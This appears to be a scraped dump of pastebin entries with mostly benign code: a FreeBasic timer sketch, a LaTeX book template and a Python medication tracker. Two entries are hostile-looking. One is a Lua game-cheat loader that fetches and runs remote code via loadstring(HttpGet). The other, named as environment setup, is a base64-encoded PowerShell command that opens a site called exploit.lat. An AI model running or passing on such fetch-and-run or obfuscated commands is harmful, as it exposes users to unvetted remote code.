    --collapse-content-back-color: #212121;
    --collapse-selected-label-border-color: #0277bd;
}

:root {
    --spinner-back-color: #ddd;
    --spinner-fore-color: #555;
}

:root {
    --status-default-back-color: #333;
    --status-default-fore-color: #eee;
    --status-default-border-color: #555;
    --status-green-back-color: #060;
    --status-green-fore-color: #dfd;
    --status-green-border-color: #282;
    --status-red-back-color: #d11;
    --status-red-fore-color: #fff;
    --status-red-border-color: #b00;
    --status-blue-back-color: #036;
    --status-blue-fore-color: #def;
    --status-blue-border-color: #258;
}"
NKtGEQRb,Untitled,Mysoft,FreeBasic,Saturday 14th of June 2025 10:16:00 AM CDT,"'implement SoundQueue type with whatever you need... frequency/duration?
static shared as SoundQueue g_SoundQueue

sub MyCallback cdecl ()

  'whatever necessary to play next note

  'then either make it fire again later with new time
  ChangeTimer( cvl(""MyID"") , {NextDelayInPITticks} )
  'or cancel the timer
  RemoveTimer( cvl(""MyID"") )

end sub

sub QueueSound() 

  asm pushfd
  asm cli 'disable interrupts while handling the g_SoundQueue (keep it disabled as least as possible)

  'add a sound to the Queue... if there isnt one
  'if the there isnt anything queded then start a timer
  AddTimer( cvl(""MyID"") , 0 , @MyCallback ) 'this will make it trigger the callback asap for you to handle next note

  asm popfd 'restore interrupts

end sub

  "
MXCkeq5C,book.tex,j0h,Latex,Saturday 14th of June 2025 10:00:35 AM CDT,"\documentclass[12pt]{book}

% --- Variable Assignments ---
\newcommand{\AuthorName}{Author}
\newcommand{\BookTitle}{Title}
\newcommand{\PublishYear}{year}

% --- Packages ---
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{geometry}
\usepackage{setspace}
\usepackage{graphicx}
\usepackage{hyperref}

% --- Page Setup ---
\geometry{margin=1in}
\setstretch{1.25}
\hypersetup{
    colorlinks=true,
    linkcolor=blue,
    urlcolor=blue,
    pdftitle={\BookTitle},
    pdfauthor={\AuthorName}
}

% --- Title Info ---
\title{\BookTitle}
\author{\AuthorName}
\date{\PublishYear}

\begin{document}

% --- Title Page ---
\maketitle
\frontmatter

% --- Preface / Acknowledgements ---
\chapter*{Preface}
This book, *\BookTitle*, was written by \AuthorName{} in \PublishYear.  
You can include your acknowledgements here.

% --- Table of Contents ---
\tableofcontents
\mainmatter

% --- Chapters ---
\chapter{Introduction}
Welcome to *\BookTitle*. This chapter introduces the core ideas of the book.

\chapter{Secure Protocols}
In this chapter, \AuthorName{} explores secure communications in networks.

\chapter{Conclusion}
Final remarks and forward-looking statements by \AuthorName.

% --- Backmatter ---
\backmatter
\chapter*{Appendix}
Additional details and supplementary data.

% --- Bibliography ---
\chapter*{Bibliography}
\begin{thebibliography}{9}
\bibitem{example}
Author Name,
\textit{Book Title},
Publisher, Year.
\end{thebibliography}

\end{document}
"
yp6U7tqX,[🛠️] Grow a Garden 🍏 Seed Spawner,velvetkk,Lua,Saturday 14th of June 2025 09:58:39 AM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/castleofsolace/GAGSeedSpawner/refs/heads/main/main.lua""))()

-- UPDATED TO LATEST VERSION [ 06/14/2025 ]
-- Added all the newest seeds
-- Added a seed sniper, will automatically search for servers with rare seeds in stock
-- Fixed seed index, now shows all seeds, their rarity and how to get them"
VawDZfDf,Medicamentos,MizunoBrasil,Python,Saturday 14th of June 2025 08:37:54 AM CDT,"import tkinter as tk
from tkinter import ttk
from tkcalendar import Calendar
import sqlite3
from datetime import datetime, date


# ---------- BANCO DE DADOS ----------
def criar_banco():
    conn = sqlite3.connect(""medicamentos.db"")
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS medicamentos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT NOT NULL
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS historico (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            medicamento_id INTEGER,
            data TEXT,
            hora TEXT,
            FOREIGN KEY(medicamento_id) REFERENCES medicamentos(id)
        )
    ''')

    conn.commit()
    conn.close()


def adicionar_medicamento(nome):
    conn = sqlite3.connect(""medicamentos.db"")
    cursor = conn.cursor()
    cursor.execute(""INSERT INTO medicamentos (nome) VALUES (?)"", (nome,))
    conn.commit()
    conn.close()


def listar_medicamentos():
    conn = sqlite3.connect(""medicamentos.db"")
    cursor = conn.cursor()
    cursor.execute(""SELECT id, nome FROM medicamentos"")
    dados = cursor.fetchall()
    conn.close()
    return dados


def registrar_tomada(medicamento_id, data):
    conn = sqlite3.connect(""medicamentos.db"")
    cursor = conn.cursor()
    hora = datetime.now().strftime('%H:%M')
    cursor.execute(""INSERT INTO historico (medicamento_id, data, hora) VALUES (?, ?, ?)"", (medicamento_id, data, hora))
    conn.commit()
    conn.close()
    return hora


def buscar_historico_do_dia(medicamento_id, data):
    conn = sqlite3.connect(""medicamentos.db"")
    cursor = conn.cursor()
    cursor.execute('''
        SELECT hora FROM historico
        WHERE medicamento_id = ? AND data = ?
        ORDER BY id ASC
    ''', (medicamento_id, data))
    resultados = cursor.fetchall()
    conn.close()
    return [r[0] for r in resultados] if resultados else []

# ---------- INTERFACE TKINTER ----------

criar_banco()

janela = tk.Tk()
janela.title(""Controle de Medicamentos"")

# Centralizar a janela
largura_janela = 700
altura_janela = 600

largura_tela = janela.winfo_screenwidth()
altura_tela = janela.winfo_screenheight()

pos_x = (largura_tela // 2) - (largura_janela // 2)
pos_y = (altura_tela // 2) - (altura_janela // 2)

janela.geometry(f""{largura_janela}x{altura_janela}+{pos_x}+{pos_y}"")
janela.resizable(False, False)

# ---------- Data Selecionada ----------
data_selecionada = date.today()


def atualizar_label_data():
    label_data.config(text=f""Data selecionada: {data_selecionada.strftime('%d/%m/%Y')}"")


# ---------- Função Calendário ----------
def escolher_data():
    def confirmar():
        global data_selecionada
        data_selecionada = cal.selection_get()
        atualizar_label_data()
        atualizar_lista()
        top.destroy()

    top = tk.Toplevel(janela)
    top.title(""Escolher Data"")
    cal = Calendar(top, selectmode='day', year=data_selecionada.year, month=data_selecionada.month, day=data_selecionada.day)
    cal.pack(pady=20)

    btn_ok = tk.Button(top, text=""Confirmar"", font=(""Arial"", 11), command=confirmar)
    btn_ok.pack(pady=10)


# ---------- Widgets ----------
frame_top = tk.Frame(janela)
frame_top.pack(pady=10)

label_titulo = tk.Label(frame_top, text=""Controle de Medicamentos"", font=(""Arial"", 18, ""bold""))
label_titulo.grid(row=0, column=0, columnspan=2)

label_data = tk.Label(frame_top, text="""", font=(""Arial"", 14))
label_data.grid(row=1, column=0, pady=5)

btn_data = tk.Button(frame_top, text=""Escolher Data"", font=(""Arial"", 11), command=escolher_data)
btn_data.grid(row=1, column=1, padx=10)

atualizar_label_data()

# ---------- Adicionar Medicamento ----------
frame_add = tk.Frame(janela)
frame_add.pack(pady=10)

entry_medicamento = tk.Entry(frame_add, width=40, font=(""Arial"", 11))
entry_medicamento.grid(row=0, column=0, padx=5)

def adicionar_click():
    nome = entry_medicamento.get().strip()
    if nome:
        adicionar_medicamento(nome)
        entry_medicamento.delete(0, tk.END)
        atualizar_lista()

btn_adicionar = tk.Button(frame_add, text=""Adicionar Medicamento"", font=(""Arial"", 11), command=adicionar_click)
btn_adicionar.grid(row=0, column=1)

# ---------- Lista de Medicamentos ----------
frame_lista = tk.Frame(janela)
frame_lista.pack(pady=10, fill=""both"", expand=True)

canvas = tk.Canvas(frame_lista)
scrollbar = ttk.Scrollbar(frame_lista, orient=""vertical"", command=canvas.yview)
scrollable_frame = tk.Frame(canvas)

scrollable_frame.bind(
    ""<Configure>"",
    lambda e: canvas.configure(
        scrollregion=canvas.bbox(""all"")
    )
)

canvas.create_window((0, 0), window=scrollable_frame, anchor=""nw"")
canvas.configure(yscrollcommand=scrollbar.set)

canvas.pack(side=""left"", fill=""both"", expand=True)
scrollbar.pack(side=""right"", fill=""y"")

# ---------- Função Atualizar Lista ----------
def atualizar_lista():
    for widget in scrollable_frame.winfo_children():
        widget.destroy()

    medicamentos = listar_medicamentos()

    for id_medic, nome in medicamentos:
        horarios = buscar_historico_do_dia(id_medic, data_selecionada.strftime('%Y-%m-%d'))
        texto_horarios = "", "".join(horarios) if horarios else ""Ainda não tomado""

        frame_item = tk.Frame(scrollable_frame, bd=1, relief=""solid"", padx=5, pady=5)
        frame_item.pack(fill=""x"", pady=2, padx=2)

        label_nome = tk.Label(frame_item, text=nome, width=25, anchor=""w"", font=(""Arial"", 12, ""bold""))
        label_nome.grid(row=0, column=0)

        label_horario = tk.Label(frame_item, text=texto_horarios, width=30, anchor=""w"", font=(""Arial"", 11))
        label_horario.grid(row=0, column=1)

        def gerar_callback(id_medicamento, label):
            def on_click():
                registrar_tomada(id_medicamento, data_selecionada.strftime('%Y-%m-%d'))
                horarios_atualizados = buscar_historico_do_dia(id_medicamento, data_selecionada.strftime('%Y-%m-%d'))
                label.config(text="", "".join(horarios_atualizados))
            return on_click

        btn_tomar = tk.Button(frame_item, text=""Tomar"", font=(""Arial"", 11), command=gerar_callback(id_medic, label_horario))
        btn_tomar.grid(row=0, column=2, padx=5)


atualizar_lista()

# ---------- Iniciar Loop ----------
janela.mainloop()
"
yYdDFy5J,Untitled,podsolnyxxx,C++,Saturday 14th of June 2025 07:31:46 AM CDT,"public class Vector {

    // Скалярное произведение
    static int dot(int[] a, int[] b) {
        int res = 0;
        for (int i = 0; i < a.length; i++) {
            res += a[i] * b[i];
        }
        return res;
    }

    // Сложение векторов
    static int[] add(int[] a, int[] b) {
        int[] res = new int[a.length];
        for (int i = 0; i < a.length; i++) {
            res[i] = a[i] + b[i];
        }
        return res;
    }

    // Пример
    public static void main(String[] args) {
        int[] x = {1, 2, 3};
        int[] y = {4, 5, 6};

        System.out.println(""Скалярное: "" + dot(x, y));

        int[] z = add(x, y);
        System.out.print(""Сумма: "");
        for (int n : z) {
            System.out.print(n + "" "");
        }
    }
}
"
7HQ3zghd,init_environment.ps1,zakaria-,Batch,Saturday 14th of June 2025 07:26:36 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AYwAyADYAYwBhADcAOQBiAA==

BCYpG4"
jeqkXYJW,aung.h,DrAungWinHtut,C++,Saturday 14th of June 2025 07:23:32 AM CDT,"#ifndef AUNG_H
#define AUNG_H
#include <iostream>
using namespace std;
#endif"
